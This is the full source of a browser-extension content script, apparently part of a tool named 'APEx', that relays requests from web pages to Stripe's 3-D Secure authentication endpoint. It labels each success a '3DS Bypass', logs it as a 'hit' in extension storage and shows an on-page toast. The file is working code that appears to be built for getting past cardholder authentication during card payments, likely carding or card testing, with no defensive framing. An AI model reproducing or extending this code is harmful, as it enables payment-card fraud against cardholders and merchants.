// APEx 3DS Relay — ISOLATED world bridge
(function() {
  if (window.__APEx_3DS_RELAY_INJECTED) return;
  window.__APEx_3DS_RELAY_INJECTED = true;

  function show3dsToast() {
    var existing = document.querySelector('.apex-3ds-toast');
    if (existing) existing.remove();
    var toast = document.createElement('div');
    toast.className = 'apex-3ds-toast';
    var now = new Date();
    var h = now.getHours() % 12 || 12;
    var m = String(now.getMinutes()).padStart(2, '0');
    var ampm = now.getHours() >= 12 ? 'PM' : 'AM';
    toast.innerHTML = '<div style="display:flex;align-items:center;gap:8px">' +
      '<span style="background:#a78bfa;color:#fff;font-size:9px;font-weight:800;padding:2px 6px;border-radius:4px;letter-spacing:0.5px;text-transform:uppercase">3DS Bypass</span>' +
      '<span style="color:#e2e8f0;font-size:12px;font-weight:600">Relayed</span>' +
      '<span style="color:#94a3b8;font-size:10px">' + h + ':' + m + ' ' + ampm + '</span></div>';
    toast.style.cssText = 'position:fixed;bottom:20px;right:20px;z-index:2147483647;' +
      'background:linear-gradient(135deg,rgba(30,20,60,0.95),rgba(20,10,40,0.95));' +
      'border:1px solid rgba(167,139,250,0.4);border-radius:10px;padding:10px 16px;' +
      'box-shadow:0 4px 24px rgba(167,139,250,0.25);backdrop-filter:blur(12px);' +
      'font-family:-apple-system,BlinkMacSystemFont,system-ui,sans-serif;' +
      'opacity:0;transform:translateY(10px);transition:opacity 0.3s,transform 0.3s;pointer-events:none;';
    document.body.appendChild(toast);
    requestAnimationFrame(function() { toast.style.opacity = '1'; toast.style.transform = 'translateY(0)'; });
    setTimeout(function() { toast.style.opacity = '0'; toast.style.transform = 'translateY(10px)'; setTimeout(function() { toast.remove(); }, 400); }, 4000);
  }

  function appendRelayLog() {
    var requestId = '3ds_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
    var entry = { timestamp: Date.now(), type: 'three_ds', response: 'three_ds', site: (window.location && window.location.hostname) || '', url: window.location.href, source: 'relay', text: '3DS Bypass relayed' };
    function handler(e) {
      if (e.source === window && e.data && e.data.type === 'APEx_STORAGE_RESPONSE' && e.data.requestId === requestId) {
        window.removeEventListener('message', handler);
        var result = e.data.result || {};
        var logs = Array.isArray(result.APEx_logs) ? result.APEx_logs : [];
        logs.push(entry);
        var setId = '3ds_set_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
        function setHandler(f) { if (f.source === window && f.data && f.data.type === 'APEx_STORAGE_RESPONSE' && f.data.requestId === setId) window.removeEventListener('message', setHandler); }
        window.addEventListener('message', setHandler);
        window.postMessage({ type: 'APEx_STORAGE_REQUEST', requestId: setId, action: 'SET', data: { APEx_logs: logs } }, '*');
        setTimeout(function() { window.removeEventListener('message', setHandler); }, 2000);
      }
    }
    window.addEventListener('message', handler);
    window.postMessage({ type: 'APEx_STORAGE_REQUEST', requestId: requestId, action: 'GET', data: { keys: ['APEx_logs'] } }, '*');
    setTimeout(function() { window.removeEventListener('message', handler); }, 3000);
  }

  // Listen for 3DS relay requests from MAIN world
  window.addEventListener("message", function(event) {
    if (!event.data || event.data.type !== "DB_3DS_RELAY_REQUEST" || !event.data.payload) return;
    var requestId = event.data.payload.requestId;
    var body = event.data.payload.body;
    var origin = (typeof window !== "undefined" && window.location) ? window.location.origin : "";
    var referer = (typeof document !== "undefined" && document.referrer) ? document.referrer : (origin ? origin + "/" : "");

    chrome.runtime.sendMessage({
      type: "APEx_3DS_RELAY",
      url: "https://api.stripe.com/v1/3ds2/authenticate",
      body: body,
      origin: origin,
      referer: referer
    }, function(response) {
      if (chrome.runtime.lastError) {
        window.postMessage({ type: "DB_3DS_RELAY_RESPONSE", payload: { requestId: requestId, error: chrome.runtime.lastError.message || "Extension error" } }, "*");
        return;
      }
      var payload = (response && response.error)
        ? { requestId: requestId, error: response.error }
        : { requestId: requestId, status: response ? response.status : undefined, statusText: response ? response.statusText : undefined, headers: response ? response.headers : undefined, body: response ? response.body : undefined };
      window.postMessage({ type: "DB_3DS_RELAY_RESPONSE", payload: payload }, "*");
      if (!payload.error) { appendRelayLog(); show3dsToast(); }
    });
  });

  // Listen for hit events to show effects on page
  if (chrome.runtime && chrome.runtime.onMessage) {
    chrome.runtime.onMessage.addListener(function(msg) {
      if (msg && msg.type === 'APEx_HIT_RECORDED') {
        show3dsToast();
      }
    });
  }
})();
